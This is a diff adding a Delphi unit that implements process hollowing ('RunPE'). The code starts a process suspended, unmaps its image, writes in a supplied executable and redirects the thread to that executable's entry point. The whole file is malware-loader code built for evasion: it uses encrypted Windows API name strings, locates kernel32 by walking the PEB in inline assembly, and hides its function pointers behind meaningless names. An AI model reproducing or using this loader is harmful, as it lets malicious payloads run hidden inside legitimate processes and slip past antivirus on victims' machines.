@@ -1,0 +1,253 @@
+unit mem;
+
+interface
+uses
+Windows,descyptstr;
+
+type
+  HANDLE        = THandle;
+  PVOID         = Pointer;
+  LPVOID        = Pointer;
+  SIZE_T        = Cardinal;
+  ULONG_PTR     = Cardinal;
+  NTSTATUS      = LongInt;
+  LONG_PTR      = Integer;
+
+  PImageSectionHeaders = ^TImageSectionHeaders;
+  TImageSectionHeaders = Array [0..95] Of TImageSectionHeader;
+
+const
+keystring = 'xvvn'; //keystring
+kernel32string = '9BC92768305DACA6F3E26CF7F5102D3E'; //kernel32.dll
+CreateProcesstring = '852E42B1D36315E1302BB99CF08EDC2A'; //CreateProcessA
+GTCstring = '99F698324D71C1AD63FC1D574317AA43'; //GetThreadContext
+STCstring = 'E8CD08D230A2960B63FC1D574317AA43'; //SetThreadContext
+RTstring = '91C4749AC985B041DAA086F2DE3616F3'; //ResumeThread
+WPMstring = 'A0132E8370BCF9C84A63D6D82911EC8BD87191A009823FBA'; //WriteProcessMemory
+RPMstring = '460513695681FED996E5B6B26EFBBE170D8BEAF9BBDE7ABA'; //ReadProcessMemory
+VAstring = 'C0A0761D1A23ADE3199A6305AD31751B'; //VirtualAllocEx
+VPstring = 'E7DFE8B6BF14740BB2F3D2D39F371CF1'; //VirtualProtectEx
+Termstring = '2B99FE2F959EC14ED72E6939525A0E80'; //TerminateProcess
+
+ntdllstring = 'DC42C264AF7E7E85C3BDC2FFEE10EDE3'; //ntdll.dll
+ZUVOSstring = 'D538DD4C18B0D6276C659C942E0B32B2257F0D9A1EF39EE4'; //ZwUnmapViewOfSection
+
+
+var
+  CNweyyaaffhjllzcvvn: Function(ProcessHandle: THandle; BaseAddress: Pointer): LongInt; stdcall;
+  OOPSDDGGKKLXCCBMMqerr: function(lpApplicationName: PChar; lpCommandLine: PChar;
+  lpProcessAttributes, lpThreadAttributes: PSecurityAttributes;
+  bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer;
+  lpCurrentDirectory: PChar; const lpStartupInfo: TStartupInfo;
+  var lpProcessInformation: TProcessInformation): BOOL; stdcall;
+  ffggjkkzxvbb: function(hThread: THandle; var lpContext: TContext): BOOL; stdcall;
+  CBNNqwwrtuuaddghkklxc: function(hThread: THandle; const lpContext: TContext): BOOL; stdcall;
+  ZZXXVBBMqqeryyasffgjk: function(hThread: THandle): DWORD; stdcall;
+  AADDFHHJLZZCVNNMwrrtu: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
+  nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL; stdcall;
+  WRRYUUOOPSDGGHKLLXCBB: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
+  nSize: DWORD; var lpNumberOfBytesRead: DWORD): BOOL; stdcall;
+  zxxvbb: function(hProcess: THandle; lpAddress: Pointer;
+  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
+  bnnQWWRRTUIPPADFFHKKL: function(hProcess: THandle; lpAddress: Pointer; dwSize: Cardinal; flNewProtect: DWORD; var lpflOldProtect: DWORD): BOOL; stdcall;
+  RRYUUOOPSDDGJKKZXVVBM: function(hProcess: THandle; uExitCode: UINT): BOOL; stdcall;
+
+
+  procedure loadapicall;
+  Function ImageFirstSection    (NTHeader: PImageNTHeaders): PImageSectionHeader;
+  Function MemoryExecute        (Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;
+implementation
+
+function xGetProcAddress(hFile:DWORD; szFunctionName:string):Pointer;
+var
+  IDH:    TImageDosHeader;
+  INH:    TImageNtHeaders;
+  IED:    IMAGE_EXPORT_DIRECTORY;
+  pNames:     Pointer;
+  i:          WORD;
+  pFuncAddr:  DWORD;
+  x:          WORD;
+begin
+  Result := nil;
+  CopyMemory(@IDH, Ptr(hFile), 64);
+  if IDH.e_magic = IMAGE_DOS_SIGNATURE then
+  begin
+    CopyMemory(@INH, Ptr(hFile + DWORD(IDH._lfanew)), 248);
+    if INH.Signature = IMAGE_NT_SIGNATURE then
+    begin
+      CopyMemory(@IED, Ptr(hFile + INH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress), 40);
+      if IED.NumberOfFunctions > 0 then
+      begin
+        pNames := Pointer(hFile + DWORD(IED.AddressOfNames));
+        x := 0;
+        for i := 0 to IED.NumberOfNames - 1 do
+        begin
+
+          if PChar(hFile + DWORD(pNames^)) = szFunctionName then
+          begin
+            CopyMemory(@pFuncAddr, Pointer(hFile + DWORD(IED.AddressOfFunctions) + x), 4);
+            pFuncAddr := pFuncAddr + hFile;
+            Result := Pointer(pFuncAddr);
+          end;
+
+          Inc(DWORD(pNames), 4);
+          Inc(x, 4);
+        end;
+      end;
+    end;
+  end;
+end;
+
+function xLoadLibrary(lpLibFileName: PAnsiChar): HMODULE;
+var
+  kernel32Addr: DWORD;
+  pLoadLibrary: function(lpLibFileName: PAnsiChar): HMODULE; stdcall;
+begin
+  asm
+    push esi
+    mov eax,fs:[30h]
+    mov eax,[eax+0Ch]
+    mov esi,[eax+1Ch]
+    lodsd
+    mov eax,[eax+08h]
+    mov kernel32Addr,eax
+    pop esi
+  end;
+  pLoadLibrary := xGetProcAddress(kernel32Addr, 'LoadLibraryA');
+  Result := pLoadLibrary(lpLibFilename);
+end;
+
+function Gpa(Name: string): string;
+begin
+  Name := DeCryptStr(Name,Keystring);
+  Result := pchar(Name);
+end;
+
+procedure loadapicall;
+var
+ Kernel32Handle,ntdll :LongWord;
+begin
+ Kernel32Handle := xLoadLibrary(pchar(Gpa(Kernel32String)));
+ @OOPSDDGGKKLXCCBMMqerr := xGetProcAddress(Kernel32Handle,pchar(Gpa(CreateProcesstring)));
+ @ffggjkkzxvbb := xGetProcAddress(Kernel32Handle,pchar(Gpa(GTCstring)));
+ @CBNNqwwrtuuaddghkklxc  := xGetProcAddress(Kernel32Handle,pchar(Gpa(STCstring)));
+ @ZZXXVBBMqqeryyasffgjk  := xGetProcAddress(Kernel32Handle,pchar(Gpa(RTstring)));
+ @AADDFHHJLZZCVNNMwrrtu  := xGetProcAddress(Kernel32Handle,pchar(Gpa(WPMstring)));
+ @WRRYUUOOPSDGGHKLLXCBB  := xGetProcAddress(Kernel32Handle,pchar(Gpa(RPMstring)));
+ @zxxvbb  := xGetProcAddress(Kernel32Handle,pchar(Gpa(VAstring)));
+ @bnnQWWRRTUIPPADFFHKKL  := xGetProcAddress(Kernel32Handle,pchar(Gpa(VPstring)));
+ @RRYUUOOPSDDGJKKZXVVBM := xGetProcAddress(Kernel32Handle,pchar(Gpa(Termstring)));
+
+ ntdll := xLoadLibrary(pchar(Gpa(ntdllstring)));
+ @CNweyyaaffhjllzcvvn := xGetProcAddress(ntdll,pchar(Gpa(ZUVOSstring)));
+end;
+
+
+
+
+Function ImageFirstSection(NTHeader: PImageNTHeaders): PImageSectionHeader;
+Begin
+  Result := PImageSectionheader( ULONG_PTR(@NTheader.OptionalHeader) +
+                                 NTHeader.FileHeader.SizeOfOptionalHeader);
+End;
+
+
+Function Protect(Characteristics: ULONG): ULONG;
+Const
+  Mapping       :Array[0..7] Of ULONG = (
+                 PAGE_NOACCESS,
+                 PAGE_EXECUTE,
+                 PAGE_READONLY,
+                 PAGE_EXECUTE_READ,
+                 PAGE_READWRITE,
+                 PAGE_EXECUTE_READWRITE,
+                 PAGE_READWRITE,
+                 PAGE_EXECUTE_READWRITE  );
+Begin
+  Result := Mapping[ Characteristics SHR 29 ];
+End;
+
+Function MemoryExecute(Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;
+Var
+  ProcessInfo           :TProcessInformation;
+  StartupInfo           :TStartupInfo;
+  Context               :TContext;
+  BaseAddress           :Pointer;
+  BytesRead             :DWORD;
+  BytesWritten          :DWORD;
+  I                     :ULONG;
+  OldProtect            :ULONG;
+  NTHeaders             :PImageNTHeaders;
+  Sections              :PImageSectionHeaders;
+  Success               :Boolean;
+Begin
+
+
+  Result := False;
+
+  FillChar(ProcessInfo, SizeOf(TProcessInformation), 0);
+  FillChar(StartupInfo, SizeOf(TStartupInfo),        0);
+
+  StartupInfo.cb := SizeOf(TStartupInfo);
+  StartupInfo.wShowWindow := Word(Visible);
+
+  If (OOPSDDGGKKLXCCBMMqerr(PChar(ProcessName), PChar(Parameters), NIL, NIL,
+                    False, CREATE_SUSPENDED, NIL, NIL, StartupInfo, ProcessInfo)) Then
+  Begin
+    Success := True;
+
+    Try
+      Context.ContextFlags := CONTEXT_INTEGER;
+      If (ffggjkkzxvbb(ProcessInfo.hThread, Context) And
+         (WRRYUUOOPSDGGHKLLXCBB(ProcessInfo.hProcess, Pointer(Context.Ebx + 8),
+                            @BaseAddress, SizeOf(BaseAddress), BytesRead)) And
+         (CNweyyaaffhjllzcvvn(ProcessInfo.hProcess, BaseAddress) >= 0)) Then
+         Begin
+           NTHeaders    := PImageNTHeaders(Cardinal(Buffer) + Cardinal(PImageDosHeader(Buffer)._lfanew));
+           BaseAddress  := zxxvbb(ProcessInfo.hProcess,
+                                          Pointer(NTHeaders.OptionalHeader.ImageBase),
+                                          NTHeaders.OptionalHeader.SizeOfImage,
+                                          MEM_RESERVE or MEM_COMMIT,
+                                          PAGE_READWRITE);
+           If (AADDFHHJLZZCVNNMwrrtu(ProcessInfo.hProcess, BaseAddress, Buffer,
+                                  NTHeaders.OptionalHeader.SizeOfHeaders,
+                                  BytesWritten)) Then
+              Begin
+                Sections := PImageSectionHeaders(ImageFirstSection(NTHeaders));
+
+                For I := 0 To NTHeaders.FileHeader.NumberOfSections -1 Do
+                  If (AADDFHHJLZZCVNNMwrrtu(ProcessInfo.hProcess,
+                                         Pointer(Cardinal(BaseAddress) +
+                                                 Sections[I].VirtualAddress),
+                                         Pointer(Cardinal(Buffer) +
+                                                 Sections[I].PointerToRawData),
+                                         Sections[I].SizeOfRawData, BytesWritten)) Then
+                     bnnQWWRRTUIPPADFFHKKL(ProcessInfo.hProcess,
+                                     Pointer(Cardinal(BaseAddress) +
+                                              Sections[I].VirtualAddress),
+                                      Sections[I].Misc.VirtualSize,
+                                      Protect(Sections[I].Characteristics),
+                                      OldProtect);
+
+                If (AADDFHHJLZZCVNNMwrrtu(ProcessInfo.hProcess,
+                                       Pointer(Context.Ebx + 8), @BaseAddress,
+                                       SizeOf(BaseAddress), BytesWritten)) Then
+                   Begin
+                     Context.Eax := ULONG(BaseAddress) +
+                                    NTHeaders.OptionalHeader.AddressOfEntryPoint;
+                     Success := CBNNqwwrtuuaddghkklxc(ProcessInfo.hThread, Context);
+                   End;
+              End;
+         End;
+    Finally
+      If (Not Success) Then
+        RRYUUOOPSDDGJKKZXVVBM(ProcessInfo.hProcess, 0)
+      Else
+        ZZXXVBBMqqeryyasffgjk(ProcessInfo.hThread);
+
+      Result := Success;
+    End;
+  End;
+End;
+
+end.
